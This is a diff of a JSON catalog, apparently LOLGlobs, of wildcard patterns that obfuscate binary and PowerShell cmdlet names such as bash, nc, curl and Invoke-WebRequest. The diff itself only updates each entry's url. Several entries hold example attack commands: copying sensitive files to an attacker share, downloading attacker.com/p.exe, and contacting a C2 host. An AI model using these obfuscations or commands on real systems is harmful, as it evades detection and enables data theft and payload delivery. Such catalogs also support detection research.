@@ -8,7 +8,7 @@
     "binaryPath": ["/usr/bin/awk","/bin/awk","/usr/bin/gawk"],
     "patternCount": 7,
     "patterns": [{"Pattern":"a?k","Wildcards":["?"],"Notes":"Wildcard replaces 'w'"},{"Pattern":"a*k","Wildcards":["*"],"Notes":"Star matches 'w'"},{"Pattern":"a[w]k","Wildcards":["[]"],"Notes":"Bracket class on second char"},{"Pattern":"[a]wk","Wildcards":["[]"],"Notes":"Bracket class on first char"},{"Pattern":"/usr/bin/a?k","Wildcards":["?"],"Notes":"Full path wildcard"},{"Pattern":"/???/bin/awk","Wildcards":["?"],"Notes":"Directory obfuscation"},{"Pattern":"gaw?","Wildcards":["?"],"Notes":"Target gawk variant"}],
-    "url": "http://localhost:4000/globs/linux/awk/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/awk/"
   },
   {
     "name": "bash",
@@ -19,7 +19,7 @@
     "binaryPath": ["/bin/bash","/usr/bin/bash"],
     "patternCount": 10,
     "patterns": [{"Pattern":"bas?","Wildcards":["?"],"Notes":"Wildcard replaces 'h'"},{"Pattern":"b*h","Wildcards":["*"],"Notes":"Star matches 'as'"},{"Pattern":"ba[s]h","Wildcards":["[]"],"Notes":"Character class around 's'"},{"Pattern":"b?sh","Wildcards":["?"],"Notes":"Wildcard replaces 'a'"},{"Pattern":"b?s?","Wildcards":["?"],"Notes":"Two wildcards"},{"Pattern":"/bin/bas?","Wildcards":["?"],"Notes":"Full path wildcard on last char"},{"Pattern":"/???/bash","Wildcards":["?"],"Notes":"Obfuscate /bin/ prefix"},{"Pattern":"/b?n/b*h","Wildcards":["?","*"],"Notes":"Mixed wildcards across path and command"},{"Pattern":"b[a]sh","Wildcards":["[]"],"Notes":"Bracket class on second char"},{"Pattern":"/???/b*","Wildcards":["?","*"],"Notes":"Highly obfuscated full path (may match other binaries)"}],
-    "url": "http://localhost:4000/globs/linux/bash/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/bash/"
   },
   {
     "name": "cat",
@@ -30,7 +30,7 @@
     "binaryPath": ["/bin/cat","/usr/bin/cat"],
     "patternCount": 8,
     "patterns": [{"Pattern":"ca?","Wildcards":["?"],"Notes":"Wildcard replaces 't'"},{"Pattern":"c*t","Wildcards":["*"],"Notes":"Star matches 'a'"},{"Pattern":"c[a]t","Wildcards":["[]"],"Notes":"Bracket class on second char"},{"Pattern":"ca[t]","Wildcards":["[]"],"Notes":"Bracket class on last char"},{"Pattern":"/bin/ca?","Wildcards":["?"],"Notes":"Full path wildcard"},{"Pattern":"/???/cat","Wildcards":["?"],"Notes":"Obfuscate /bin/ prefix"},{"Pattern":"/b?n/cat","Wildcards":["?"],"Notes":"Wildcard in bin directory"},{"Pattern":"c?t","Wildcards":["?"],"Notes":"Middle wildcard"}],
-    "url": "http://localhost:4000/globs/linux/cat/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/cat/"
   },
   {
     "name": "chmod",
@@ -41,7 +41,7 @@
     "binaryPath": ["/bin/chmod","/usr/bin/chmod"],
     "patternCount": 8,
     "patterns": [{"Pattern":"chmo?","Wildcards":["?"],"Notes":"Wildcard replaces 'd'"},{"Pattern":"ch*d","Wildcards":["*"],"Notes":"Star matches 'mo'"},{"Pattern":"c?mod","Wildcards":["?"],"Notes":"Wildcard replaces 'h'"},{"Pattern":"chm[o]d","Wildcards":["[]"],"Notes":"Bracket class on fourth char"},{"Pattern":"/bin/chmo?","Wildcards":["?"],"Notes":"Full path wildcard"},{"Pattern":"/???/bin/chmod","Wildcards":["?"],"Notes":"Directory obfuscation"},{"Pattern":"c*od","Wildcards":["*"],"Notes":"Aggressive star wildcard"},{"Pattern":"ch?od","Wildcards":["?"],"Notes":"Wildcard replaces 'm'"}],
-    "url": "http://localhost:4000/globs/linux/chmod/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/chmod/"
   },
   {
     "name": "chown",
@@ -52,7 +52,7 @@
     "binaryPath": ["/bin/chown","/usr/bin/chown"],
     "patternCount": 7,
     "patterns": [{"Pattern":"chow?","Wildcards":["?"],"Notes":"Wildcard replaces 'n'"},{"Pattern":"ch*n","Wildcards":["*"],"Notes":"Star matches 'ow'"},{"Pattern":"c?own","Wildcards":["?"],"Notes":"Wildcard replaces 'h'"},{"Pattern":"cho[w]n","Wildcards":["[]"],"Notes":"Bracket class on fourth char"},{"Pattern":"/bin/chow?","Wildcards":["?"],"Notes":"Full path wildcard"},{"Pattern":"/???/bin/chown","Wildcards":["?"],"Notes":"Directory obfuscation"},{"Pattern":"c*wn","Wildcards":["*"],"Notes":"Star wildcard for middle chars"}],
-    "url": "http://localhost:4000/globs/linux/chown/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/chown/"
   },
   {
     "name": "curl",
@@ -63,7 +63,7 @@
     "binaryPath": ["/usr/bin/curl","/bin/curl"],
     "patternCount": 10,
     "patterns": [{"Pattern":"cur?","Wildcards":["?"],"Notes":"Single wildcard replaces 'l'"},{"Pattern":"c*l","Wildcards":["*"],"Notes":"Star matches 'ur'"},{"Pattern":"cu[r]l","Wildcards":["[]"],"Notes":"Character class around 'r'"},{"Pattern":"c?r?","Wildcards":["?"],"Notes":"Two wildcards replace 'u' and 'l'"},{"Pattern":"/usr/bin/cur?","Wildcards":["?"],"Notes":"Full path, wildcard on last char"},{"Pattern":"/???/bin/curl","Wildcards":["?"],"Notes":"Obfuscate /usr/ prefix"},{"Pattern":"/usr/*/cur?","Wildcards":["*","?"],"Notes":"Combined wildcards on directory and command"},{"Pattern":"cur[l]","Wildcards":["[]"],"Notes":"Bracket class on final char"},{"Pattern":"c[u]rl","Wildcards":["[]"],"Notes":"Bracket class on second char"},{"Pattern":"/???/???/c*","Wildcards":["?","*"],"Notes":"Full path obfuscation with mixed wildcards"}],
-    "url": "http://localhost:4000/globs/linux/curl/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/curl/"
   },
   {
     "name": "find",
@@ -74,7 +74,7 @@
     "binaryPath": ["/usr/bin/find","/bin/find"],
     "patternCount": 8,
     "patterns": [{"Pattern":"fin?","Wildcards":["?"],"Notes":"Wildcard replaces 'd'"},{"Pattern":"f*d","Wildcards":["*"],"Notes":"Star matches 'in'"},{"Pattern":"fi[n]d","Wildcards":["[]"],"Notes":"Bracket class on third char"},{"Pattern":"f?nd","Wildcards":["?"],"Notes":"Wildcard replaces 'i'"},{"Pattern":"fin[d]","Wildcards":["[]"],"Notes":"Bracket class on last char"},{"Pattern":"/usr/bin/fin?","Wildcards":["?"],"Notes":"Full path wildcard"},{"Pattern":"/???/bin/f*d","Wildcards":["?","*"],"Notes":"Full path mixed wildcards"},{"Pattern":"f?n?","Wildcards":["?"],"Notes":"Two wildcards"}],
-    "url": "http://localhost:4000/globs/linux/find/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/find/"
   },
   {
     "name": "id",
@@ -85,7 +85,7 @@
     "binaryPath": ["/usr/bin/id","/bin/id"],
     "patternCount": 6,
     "patterns": [{"Pattern":"[i]d","Wildcards":["[]"],"Notes":"Bracket class on first char"},{"Pattern":"i[d]","Wildcards":["[]"],"Notes":"Bracket class on second char"},{"Pattern":"/usr/bin/id","Wildcards":[],"Notes":"Full absolute path — avoids matching shell builtin 'id'"},{"Pattern":"/???/bin/id","Wildcards":["?"],"Notes":"Obfuscate /usr/ prefix"},{"Pattern":"/???/???/id","Wildcards":["?"],"Notes":"Full path component obfuscation"},{"Pattern":"/usr/*/id","Wildcards":["*"],"Notes":"Wildcard in bin directory"}],
-    "url": "http://localhost:4000/globs/linux/id/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/id/"
   },
   {
     "name": "nc",
@@ -96,7 +96,7 @@
     "binaryPath": ["/bin/nc","/usr/bin/nc","/bin/netcat","/usr/bin/ncat"],
     "patternCount": 8,
     "patterns": [{"Pattern":"n?","Wildcards":["?"],"Notes":"Single char wildcard — may match other n? binaries; use full path for precision"},{"Pattern":"n[c]","Wildcards":["[]"],"Notes":"Character class on second char"},{"Pattern":"/bin/n?","Wildcards":["?"],"Notes":"Full path narrows match to /bin/nc"},{"Pattern":"/???/bin/nc","Wildcards":["?"],"Notes":"Obfuscate /usr/ prefix"},{"Pattern":"/bin/n[c]","Wildcards":["[]"],"Notes":"Full path with bracket class"},{"Pattern":"net?at","Wildcards":["?"],"Notes":"Matches netcat with wildcard replacing 'c'"},{"Pattern":"nc*","Wildcards":["*"],"Notes":"Star suffix — matches nc, ncat, ncftp etc."},{"Pattern":"n[c]*","Wildcards":["[]","*"],"Notes":"Bracket then star for ncat, ncat6 variants"}],
-    "url": "http://localhost:4000/globs/linux/nc/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/nc/"
   },
   {
     "name": "nmap",
@@ -107,7 +107,7 @@
     "binaryPath": ["/usr/bin/nmap","/usr/local/bin/nmap"],
     "patternCount": 7,
     "patterns": [{"Pattern":"nma?","Wildcards":["?"],"Notes":"Wildcard replaces 'p'"},{"Pattern":"n*p","Wildcards":["*"],"Notes":"Star matches 'ma'"},{"Pattern":"nm[a]p","Wildcards":["[]"],"Notes":"Bracket class on third char"},{"Pattern":"n?ap","Wildcards":["?"],"Notes":"Wildcard replaces 'm'"},{"Pattern":"nma[p]","Wildcards":["[]"],"Notes":"Bracket class on last char"},{"Pattern":"/usr/bin/nma?","Wildcards":["?"],"Notes":"Full path wildcard"},{"Pattern":"/???/bin/n*p","Wildcards":["?","*"],"Notes":"Full path mixed wildcards"}],
-    "url": "http://localhost:4000/globs/linux/nmap/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/nmap/"
   },
   {
     "name": "perl",
@@ -118,7 +118,7 @@
     "binaryPath": ["/usr/bin/perl","/usr/local/bin/perl"],
     "patternCount": 7,
     "patterns": [{"Pattern":"per?","Wildcards":["?"],"Notes":"Wildcard replaces 'l'"},{"Pattern":"p*l","Wildcards":["*"],"Notes":"Star matches 'er'"},{"Pattern":"pe[r]l","Wildcards":["[]"],"Notes":"Bracket class on third char"},{"Pattern":"p?rl","Wildcards":["?"],"Notes":"Wildcard replaces 'e'"},{"Pattern":"per[l]","Wildcards":["[]"],"Notes":"Bracket class on last char"},{"Pattern":"/usr/bin/per?","Wildcards":["?"],"Notes":"Full path wildcard"},{"Pattern":"/???/bin/p*l","Wildcards":["?","*"],"Notes":"Full path mixed wildcards"}],
-    "url": "http://localhost:4000/globs/linux/perl/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/perl/"
   },
   {
     "name": "python3",
@@ -129,7 +129,7 @@
     "binaryPath": ["/usr/bin/python3","/usr/bin/python3.x","/usr/local/bin/python3"],
     "patternCount": 10,
     "patterns": [{"Pattern":"python?","Wildcards":["?"],"Notes":"Matches python3, python2, etc."},{"Pattern":"p?thon3","Wildcards":["?"],"Notes":"Wildcard replaces 'y'"},{"Pattern":"py*3","Wildcards":["*"],"Notes":"Star matches 'thon'"},{"Pattern":"pyth[o]n3","Wildcards":["[]"],"Notes":"Character class around 'o'"},{"Pattern":"p*3","Wildcards":["*"],"Notes":"Aggressive star wildcard"},{"Pattern":"python[3]","Wildcards":["[]"],"Notes":"Bracket class on version digit"},{"Pattern":"/usr/bin/python?","Wildcards":["?"],"Notes":"Full path wildcard on version"},{"Pattern":"/???/bin/p*3","Wildcards":["?","*"],"Notes":"Full path with mixed wildcards"},{"Pattern":"py?hon3","Wildcards":["?"],"Notes":"Wildcard replaces 't'"},{"Pattern":"/usr/*/python3","Wildcards":["*"],"Notes":"Wildcard in directory traversal"}],
-    "url": "http://localhost:4000/globs/linux/python3/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/python3/"
   },
   {
     "name": "rsync",
@@ -140,7 +140,7 @@
     "binaryPath": ["/usr/bin/rsync","/usr/local/bin/rsync"],
     "patternCount": 7,
     "patterns": [{"Pattern":"rsyn?","Wildcards":["?"],"Notes":"Wildcard replaces 'c'"},{"Pattern":"r*c","Wildcards":["*"],"Notes":"Star matches 'syn'"},{"Pattern":"rs[y]nc","Wildcards":["[]"],"Notes":"Bracket class on third char"},{"Pattern":"r?ync","Wildcards":["?"],"Notes":"Wildcard replaces 's'"},{"Pattern":"rsyn[c]","Wildcards":["[]"],"Notes":"Bracket class on last char"},{"Pattern":"/usr/bin/rsyn?","Wildcards":["?"],"Notes":"Full path wildcard"},{"Pattern":"/???/bin/r*c","Wildcards":["?","*"],"Notes":"Full path mixed wildcards"}],
-    "url": "http://localhost:4000/globs/linux/rsync/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/rsync/"
   },
   {
     "name": "ruby",
@@ -151,7 +151,7 @@
     "binaryPath": ["/usr/bin/ruby","/usr/local/bin/ruby"],
     "patternCount": 7,
     "patterns": [{"Pattern":"rub?","Wildcards":["?"],"Notes":"Wildcard replaces 'y'"},{"Pattern":"r*y","Wildcards":["*"],"Notes":"Star matches 'ub'"},{"Pattern":"ru[b]y","Wildcards":["[]"],"Notes":"Bracket class on third char"},{"Pattern":"r?by","Wildcards":["?"],"Notes":"Wildcard replaces 'u'"},{"Pattern":"rub[y]","Wildcards":["[]"],"Notes":"Bracket class on last char"},{"Pattern":"/usr/bin/rub?","Wildcards":["?"],"Notes":"Full path wildcard"},{"Pattern":"/???/???/r*y","Wildcards":["?","*"],"Notes":"Full path mixed wildcards"}],
-    "url": "http://localhost:4000/globs/linux/ruby/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/ruby/"
   },
   {
     "name": "scp",
@@ -162,7 +162,7 @@
     "binaryPath": ["/usr/bin/scp","/bin/scp"],
     "patternCount": 6,
     "patterns": [{"Pattern":"sc?","Wildcards":["?"],"Notes":"Wildcard replaces 'p'"},{"Pattern":"s*p","Wildcards":["*"],"Notes":"Star matches 'c'"},{"Pattern":"s[c]p","Wildcards":["[]"],"Notes":"Bracket class on second char"},{"Pattern":"sc[p]","Wildcards":["[]"],"Notes":"Bracket class on last char"},{"Pattern":"/usr/bin/sc?","Wildcards":["?"],"Notes":"Full path wildcard"},{"Pattern":"/???/bin/scp","Wildcards":["?"],"Notes":"Directory obfuscation"}],
-    "url": "http://localhost:4000/globs/linux/scp/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/scp/"
   },
   {
     "name": "sed",
@@ -173,7 +173,7 @@
     "binaryPath": ["/bin/sed","/usr/bin/sed"],
     "patternCount": 6,
     "patterns": [{"Pattern":"se?","Wildcards":["?"],"Notes":"Wildcard replaces 'd'"},{"Pattern":"s*d","Wildcards":["*"],"Notes":"Star matches 'e'"},{"Pattern":"s[e]d","Wildcards":["[]"],"Notes":"Bracket class on second char"},{"Pattern":"se[d]","Wildcards":["[]"],"Notes":"Bracket class on last char"},{"Pattern":"/bin/se?","Wildcards":["?"],"Notes":"Full path wildcard"},{"Pattern":"/???/bin/sed","Wildcards":["?"],"Notes":"Directory obfuscation"}],
-    "url": "http://localhost:4000/globs/linux/sed/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/sed/"
   },
   {
     "name": "socat",
@@ -184,7 +184,7 @@
     "binaryPath": ["/usr/bin/socat","/usr/local/bin/socat"],
     "patternCount": 8,
     "patterns": [{"Pattern":"soca?","Wildcards":["?"],"Notes":"Wildcard replaces 't'"},{"Pattern":"s*t","Wildcards":["*"],"Notes":"Star matches 'oca'"},{"Pattern":"so[c]at","Wildcards":["[]"],"Notes":"Bracket class on third char"},{"Pattern":"s?cat","Wildcards":["?"],"Notes":"Wildcard replaces 'o'"},{"Pattern":"soc[a]t","Wildcards":["[]"],"Notes":"Bracket class on fourth char"},{"Pattern":"/usr/bin/soca?","Wildcards":["?"],"Notes":"Full path wildcard"},{"Pattern":"/???/bin/s*t","Wildcards":["?","*"],"Notes":"Full path mixed wildcards"},{"Pattern":"s?c*t","Wildcards":["?","*"],"Notes":"Multiple wildcards in command"}],
-    "url": "http://localhost:4000/globs/linux/socat/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/socat/"
   },
   {
     "name": "ssh",
@@ -195,7 +195,7 @@
     "binaryPath": ["/usr/bin/ssh","/bin/ssh"],
     "patternCount": 7,
     "patterns": [{"Pattern":"ss?","Wildcards":["?"],"Notes":"Wildcard replaces 'h'"},{"Pattern":"s*h","Wildcards":["*"],"Notes":"Star matches 's'"},{"Pattern":"s[s]h","Wildcards":["[]"],"Notes":"Bracket class on second char"},{"Pattern":"ss[h]","Wildcards":["[]"],"Notes":"Bracket class on last char"},{"Pattern":"/usr/bin/ss?","Wildcards":["?"],"Notes":"Full path wildcard"},{"Pattern":"/???/bin/ssh","Wildcards":["?"],"Notes":"Directory obfuscation"},{"Pattern":"/???/???/s*h","Wildcards":["?","*"],"Notes":"Full path with mixed wildcards"}],
-    "url": "http://localhost:4000/globs/linux/ssh/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/ssh/"
   },
   {
     "name": "tar",
@@ -206,7 +206,7 @@
     "binaryPath": ["/bin/tar","/usr/bin/tar"],
     "patternCount": 7,
     "patterns": [{"Pattern":"ta?","Wildcards":["?"],"Notes":"Wildcard replaces 'r'"},{"Pattern":"t*r","Wildcards":["*"],"Notes":"Star matches 'a'"},{"Pattern":"t[a]r","Wildcards":["[]"],"Notes":"Bracket class on second char"},{"Pattern":"ta[r]","Wildcards":["[]"],"Notes":"Bracket class on last char"},{"Pattern":"/bin/ta?","Wildcards":["?"],"Notes":"Full path wildcard"},{"Pattern":"/???/bin/tar","Wildcards":["?"],"Notes":"Directory obfuscation"},{"Pattern":"/b?n/t*r","Wildcards":["?","*"],"Notes":"Mixed wildcards"}],
-    "url": "http://localhost:4000/globs/linux/tar/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/tar/"
   },
   {
     "name": "wget",
@@ -217,7 +217,7 @@
     "binaryPath": ["/usr/bin/wget","/bin/wget"],
     "patternCount": 10,
     "patterns": [{"Pattern":"wge?","Wildcards":["?"],"Notes":"Wildcard replaces 't'"},{"Pattern":"w*t","Wildcards":["*"],"Notes":"Star matches 'ge'"},{"Pattern":"wg[e]t","Wildcards":["[]"],"Notes":"Character class around 'e'"},{"Pattern":"w?et","Wildcards":["?"],"Notes":"Wildcard replaces 'g'"},{"Pattern":"w?e?","Wildcards":["?"],"Notes":"Two wildcards replace 'g' and 't'"},{"Pattern":"/usr/bin/wge?","Wildcards":["?"],"Notes":"Full path wildcard on last char"},{"Pattern":"/???/bin/wget","Wildcards":["?"],"Notes":"Obfuscate /usr/ directory"},{"Pattern":"/???/???/w*","Wildcards":["?","*"],"Notes":"Full path with mixed wildcards"},{"Pattern":"w[g]et","Wildcards":["[]"],"Notes":"Bracket class on second char"},{"Pattern":"wg[et]","Wildcards":["[]"],"Notes":"Bracket class matching last two chars (matches any single char in set)"}],
-    "url": "http://localhost:4000/globs/linux/wget/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/wget/"
   },
   {
     "name": "whoami",
@@ -228,7 +228,7 @@
     "binaryPath": ["/usr/bin/whoami","/bin/whoami"],
     "patternCount": 10,
     "patterns": [{"Pattern":"w?oami","Wildcards":["?"],"Notes":"Single char wildcard replaces 'h'"},{"Pattern":"w*i","Wildcards":["*"],"Notes":"Star matches 'hoam'"},{"Pattern":"who[a]mi","Wildcards":["[]"],"Notes":"Character class with single correct char"},{"Pattern":"wh?ami","Wildcards":["?"],"Notes":"Wildcard replaces 'o'"},{"Pattern":"/usr/bin/w?oami","Wildcards":["?"],"Notes":"Full path with single wildcard"},{"Pattern":"/???/???/whoami","Wildcards":["?"],"Notes":"Directory components obfuscated with ? sequences"},{"Pattern":"/???/b??/w*","Wildcards":["?","*"],"Notes":"Combined ? and * across full path"},{"Pattern":"w[ho]*i","Wildcards":["[]","*"],"Notes":"Character class plus star for middle"},{"Pattern":"wh[o]am[i]","Wildcards":["[]"],"Notes":"Multiple character classes, each containing correct char"},{"Pattern":"/usr/*/whoami","Wildcards":["*"],"Notes":"Wildcard in directory component"}],
-    "url": "http://localhost:4000/globs/linux/whoami/"
+    "url": "http://localhost:4000/LOLGlobs/globs/linux/whoami/"
   },
   {
     "name": "curl",
@@ -239,7 +239,7 @@
     "binaryPath": ["/usr/bin/curl"],
     "patternCount": 7,
     "patterns": [{"Pattern":"cur?","Wildcards":["?"],"Notes":"Single wildcard replaces 'l'"},{"Pattern":"c*l","Wildcards":["*"],"Notes":"Star matches 'ur'"},{"Pattern":"cu[r]l","Wildcards":["[]"],"Notes":"Bracket class on third char"},{"Pattern":"c?r?","Wildcards":["?"],"Notes":"Two wildcards"},{"Pattern":"/usr/bin/cur?","Wildcards":["?"],"Notes":"Full path wildcard"},{"Pattern":"/???/bin/curl","Wildcards":["?"],"Notes":"Directory obfuscation"},{"Pattern":"/???/???/c*l","Wildcards":["?","*"],"Notes":"Full path with mixed wildcards"}],
-    "url": "http://localhost:4000/globs/macos/curl/"
+    "url": "http://localhost:4000/LOLGlobs/globs/macos/curl/"
   },
   {
     "name": "open",
@@ -250,7 +250,7 @@
     "binaryPath": ["/usr/bin/open"],
     "patternCount": 7,
     "patterns": [{"Pattern":"ope?","Wildcards":["?"],"Notes":"Wildcard replaces 'n'"},{"Pattern":"o*n","Wildcards":["*"],"Notes":"Star matches 'pe'"},{"Pattern":"op[e]n","Wildcards":["[]"],"Notes":"Bracket class on third char"},{"Pattern":"o?en","Wildcards":["?"],"Notes":"Wildcard replaces 'p'"},{"Pattern":"ope[n]","Wildcards":["[]"],"Notes":"Bracket class on last char"},{"Pattern":"/usr/bin/ope?","Wildcards":["?"],"Notes":"Full path wildcard"},{"Pattern":"/???/bin/o*n","Wildcards":["?","*"],"Notes":"Full path mixed wildcards"}],
-    "url": "http://localhost:4000/globs/macos/open/"
+    "url": "http://localhost:4000/LOLGlobs/globs/macos/open/"
   },
   {
     "name": "osascript",
@@ -261,7 +261,7 @@
     "binaryPath": ["/usr/bin/osascript"],
     "patternCount": 8,
     "patterns": [{"Pattern":"osasc*","Wildcards":["*"],"Notes":"Star matches 'ript'"},{"Pattern":"o?ascript","Wildcards":["?"],"Notes":"Wildcard replaces 's'"},{"Pattern":"osa?cript","Wildcards":["?"],"Notes":"Wildcard replaces 's' in middle"},{"Pattern":"osascri?t","Wildcards":["?"],"Notes":"Wildcard replaces 'p'"},{"Pattern":"o*t","Wildcards":["*"],"Notes":"Aggressive star wildcard"},{"Pattern":"/usr/bin/osasc*","Wildcards":["*"],"Notes":"Full path wildcard"},{"Pattern":"/???/bin/o*t","Wildcards":["?","*"],"Notes":"Full path mixed wildcards"},{"Pattern":"osascri[p]t","Wildcards":["[]"],"Notes":"Bracket class on 'p'"}],
-    "url": "http://localhost:4000/globs/macos/osascript/"
+    "url": "http://localhost:4000/LOLGlobs/globs/macos/osascript/"
   },
   {
     "name": "python3",
@@ -272,7 +272,7 @@
     "binaryPath": ["/usr/bin/python3","/usr/local/bin/python3","/opt/homebrew/bin/python3"],
     "patternCount": 8,
     "patterns": [{"Pattern":"python?","Wildcards":["?"],"Notes":"Matches python3, python2 etc."},{"Pattern":"p?thon3","Wildcards":["?"],"Notes":"Wildcard replaces 'y'"},{"Pattern":"py*3","Wildcards":["*"],"Notes":"Star matches 'thon'"},{"Pattern":"pyth[o]n3","Wildcards":["[]"],"Notes":"Bracket class on 'o'"},{"Pattern":"python[3]","Wildcards":["[]"],"Notes":"Bracket class on version digit"},{"Pattern":"/usr/bin/python?","Wildcards":["?"],"Notes":"Full path wildcard on version"},{"Pattern":"/???/bin/p*3","Wildcards":["?","*"],"Notes":"Full path mixed wildcards"},{"Pattern":"/opt/homebrew/bin/python?","Wildcards":["?"],"Notes":"Homebrew install path"}],
-    "url": "http://localhost:4000/globs/macos/python3/"
+    "url": "http://localhost:4000/LOLGlobs/globs/macos/python3/"
   },
   {
     "name": "Copy-Item",
@@ -283,7 +283,7 @@
     "binaryPath": ["PowerShell cmdlet"],
     "patternCount": 6,
     "patterns": [{"Pattern":"& (gcm C*-I*m) -Path C:\\sensitive -Destination \\\\attacker\\share","Wildcards":["*"],"Notes":"Wildcards in both verb and noun"},{"Pattern":"& (gcm Copy-It*) -Path ...","Wildcards":["*"],"Notes":"Star matches 'em'"},{"Pattern":"& (gcm C?py-Item) -Path ...","Wildcards":["?"],"Notes":"Single char wildcard replaces 'o'"},{"Pattern":"copy -Path src -Destination dst","Wildcards":[],"Notes":"Alias 'copy' for Copy-Item"},{"Pattern":"cp -Path src -Destination dst","Wildcards":[],"Notes":"Alias 'cp' for Copy-Item"},{"Pattern":"& (gcm *-Item) -Path ...","Wildcards":["*"],"Notes":"Prefix wildcard — note: matches Get-Item, Set-Item etc."}],
-    "url": "http://localhost:4000/globs/powershell/copy-item/"
+    "url": "http://localhost:4000/LOLGlobs/globs/powershell/copy-item/"
   },
   {
     "name": "Get-Content",
@@ -294,7 +294,7 @@
     "binaryPath": ["PowerShell cmdlet"],
     "patternCount": 6,
     "patterns": [{"Pattern":"& (gcm G*-C*t) C:\\Windows\\System32\\drivers\\etc\\hosts","Wildcards":["*"],"Notes":"Wildcards in both verb and noun"},{"Pattern":"& (gcm Get-Con*) ...","Wildcards":["*"],"Notes":"Star matches 'tent'"},{"Pattern":"& (gcm G?t-Content) ...","Wildcards":["?"],"Notes":"Single char wildcard replaces 'e'"},{"Pattern":"gc C:\\sensitive\\file.txt","Wildcards":[],"Notes":"Built-in alias 'gc' for Get-Content"},{"Pattern":"cat C:\\sensitive\\file.txt","Wildcards":[],"Notes":"Alias 'cat' also works in PowerShell"},{"Pattern":"& (gcm *Content) ...","Wildcards":["*"],"Notes":"Prefix wildcard"}],
-    "url": "http://localhost:4000/globs/powershell/get-content/"
+    "url": "http://localhost:4000/LOLGlobs/globs/powershell/get-content/"
   },
   {
     "name": "Invoke-Command",
@@ -305,7 +305,7 @@
     "binaryPath": ["PowerShell cmdlet"],
     "patternCount": 5,
     "patterns": [{"Pattern":"& (gcm I*-C*d) -ComputerName TARGET -ScriptBlock { whoami }","Wildcards":["*"],"Notes":"Wildcards in verb and noun"},{"Pattern":"& (gcm Invoke-Com*) -ComputerName ...","Wildcards":["*"],"Notes":"Star matches 'mand'"},{"Pattern":"& (gcm I*ke-Command) -ComputerName ...","Wildcards":["*"],"Notes":"Wildcard in verb"},{"Pattern":"& (gcm *-Command) -ComputerName ...","Wildcards":["*"],"Notes":"Prefix wildcard"},{"Pattern":"icm -ComputerName TARGET -ScriptBlock { id }","Wildcards":[],"Notes":"Built-in alias 'icm'"}],
-    "url": "http://localhost:4000/globs/powershell/invoke-command/"
+    "url": "http://localhost:4000/LOLGlobs/globs/powershell/invoke-command/"
   },
   {
     "name": "Invoke-Expression",
@@ -316,7 +316,7 @@
     "binaryPath": ["PowerShell cmdlet"],
     "patternCount": 7,
     "patterns": [{"Pattern":"& (gcm I*ke-E*) 'Get-Process'","Wildcards":["*"],"Notes":"Wildcards in both verb and noun"},{"Pattern":"& (gal i?x) 'whoami'","Wildcards":["?"],"Notes":"Get-Alias (gal) with wildcard — 'iex' is the alias for Invoke-Expression"},{"Pattern":"& (gal ?e?) 'whoami'","Wildcards":["?"],"Notes":"Wildcards around 'e' in 'iex' alias"},{"Pattern":"iex 'whoami'","Wildcards":[],"Notes":"Direct alias use — not a glob but the canonical short form"},{"Pattern":"& (gcm *xpression) 'payload'","Wildcards":["*"],"Notes":"Wildcard prefix matches 'Invoke-E'"},{"Pattern":"& (gcm Invoke-Ex*) 'payload'","Wildcards":["*"],"Notes":"Wildcard suffix matches 'pression'"},{"Pattern":"& (Get-Alias i?x) 'payload'","Wildcards":["?"],"Notes":"Full Get-Alias with wildcard"}],
-    "url": "http://localhost:4000/globs/powershell/invoke-expression/"
+    "url": "http://localhost:4000/LOLGlobs/globs/powershell/invoke-expression/"
   },
   {
     "name": "Invoke-RestMethod",
@@ -327,7 +327,7 @@
     "binaryPath": ["PowerShell cmdlet"],
     "patternCount": 6,
     "patterns": [{"Pattern":"& (gcm I*-R*M*) -Uri http://c2.example.com/cmd","Wildcards":["*"],"Notes":"Wildcards in verb and both parts of noun"},{"Pattern":"& (gcm Invoke-Rest*) -Uri ...","Wildcards":["*"],"Notes":"Star matches 'Method'"},{"Pattern":"& (gcm I*ke-RestMethod) -Uri ...","Wildcards":["*"],"Notes":"Wildcard in verb only"},{"Pattern":"& (gcm *RestMethod) -Uri ...","Wildcards":["*"],"Notes":"Prefix wildcard"},{"Pattern":"irm -Uri ...","Wildcards":[],"Notes":"Built-in alias 'irm' — not a glob but used in combination"},{"Pattern":"& (gcm *-Rest*od) -Uri ...","Wildcards":["*"],"Notes":"Multiple wildcards with partial matching"}],
-    "url": "http://localhost:4000/globs/powershell/invoke-restmethod/"
+    "url": "http://localhost:4000/LOLGlobs/globs/powershell/invoke-restmethod/"
   },
   {
     "name": "Invoke-WebRequest",
@@ -338,7 +338,7 @@
     "binaryPath": ["PowerShell cmdlet (System.Net.WebClient wrapper)"],
     "patternCount": 6,
     "patterns": [{"Pattern":"& (gcm I*oke-W*R*) -Uri http://attacker.com/p.exe -OutFile C:\\p.exe","Wildcards":["*"],"Notes":"Get-Command (gcm) resolves cmdlet by wildcard. I*oke matches Invoke, W*R* matches WebRequest"},{"Pattern":"& (gcm Inv?ke-WebRequest) -Uri ...","Wildcards":["?"],"Notes":"Single char wildcard replaces 'o'"},{"Pattern":"& (gcm I*-W*t) -Uri ...","Wildcards":["*"],"Notes":"Abbreviated wildcards, still resolves to Invoke-WebRequest"},{"Pattern":"iwr -Uri ...","Wildcards":[],"Notes":"Built-in alias 'iwr' — not a glob but commonly used obfuscation"},{"Pattern":"& (Get-Command *Web*quest) -Uri ...","Wildcards":["*"],"Notes":"Full Get-Command with wildcards around 'Web'"},{"Pattern":"& (gcm *-WebR*) -Uri ...","Wildcards":["*"],"Notes":"Wildcard before verb and in noun"}],
